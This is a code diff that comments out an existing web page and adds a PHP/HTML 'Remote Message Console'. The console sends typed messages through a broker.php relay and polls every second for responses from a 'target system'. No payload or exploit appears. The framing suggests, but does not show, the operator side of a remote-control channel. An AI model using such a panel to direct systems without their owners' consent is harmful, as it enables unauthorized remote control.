@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!--<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -55,4 +55,230 @@
         });
     </script>
 </body>
+</html>
+--!>
+!-->
+<?php
+// index.php
+?>
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+
+    <meta charset="UTF-8">
+    <title>Remote Message Console</title>
+
+
+    <style>
+
+        body {
+            background-color: #121212;
+            color: #00ff00;
+            font-family: monospace;
+            padding: 20px;
+        }
+
+
+        #terminal {
+
+            width: 100%;
+            height: 400px;
+
+            background-color: #000;
+
+            border: 1px solid #333;
+
+            padding: 10px;
+
+            overflow-y: auto;
+
+            white-space: pre-wrap;
+
+            box-sizing: border-box;
+
+            margin-bottom: 10px;
+        }
+
+
+        #msg {
+
+            width: 80%;
+
+            background: #222;
+
+            border: 1px solid #555;
+
+            color: white;
+
+            padding: 10px;
+
+            font-family: monospace;
+        }
+
+
+        button {
+
+            width: 18%;
+
+            padding: 10px;
+
+            background: #00ff00;
+
+            color: black;
+
+            font-weight: bold;
+
+            cursor: pointer;
+
+            border: none;
+        }
+
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+    <h2>
+        Remote Message Console
+    </h2>
+
+
+    <div id="terminal">
+        Waiting for target system...
+    </div>
+
+
+
+    <input
+        type="text"
+        id="msg"
+        placeholder="Type message..."
+    >
+
+
+
+    <button onclick="sendMessage()">
+        Send
+    </button>
+
+
+
+
+<script>
+
+
+const terminal = document.getElementById("terminal");
+
+
+
+function sendMessage()
+{
+
+    let msg =
+        document.getElementById("msg").value;
+
+
+
+    fetch(
+        "broker.php?action=send",
+        {
+
+            method: "POST",
+
+            headers:
+            {
+                "Content-Type":
+                "application/x-www-form-urlencoded"
+            },
+
+
+            body:
+                "msg=" +
+                encodeURIComponent(msg)
+
+        }
+    );
+
+
+
+    document.getElementById("msg").value = "";
+
+}
+
+
+
+
+
+function updateStatus()
+{
+
+    fetch(
+        "broker.php?action=status"
+    )
+
+
+    .then(
+        response => response.json()
+    )
+
+
+    .then(
+        data =>
+        {
+
+
+            if(data.online)
+            {
+
+                terminal.textContent = "";
+
+
+                data.responses.forEach(
+                    message =>
+                    {
+
+                        terminal.textContent +=
+                            message + "\n";
+
+                    }
+                );
+
+
+            }
+            else
+            {
+
+                terminal.textContent =
+                    "Waiting for target system...";
+
+            }
+
+
+        }
+    );
+
+}
+
+
+
+
+
+setInterval(
+    updateStatus,
+    1000
+);
+
+
+
+</script>
+
+
+</body>
+
 </html>
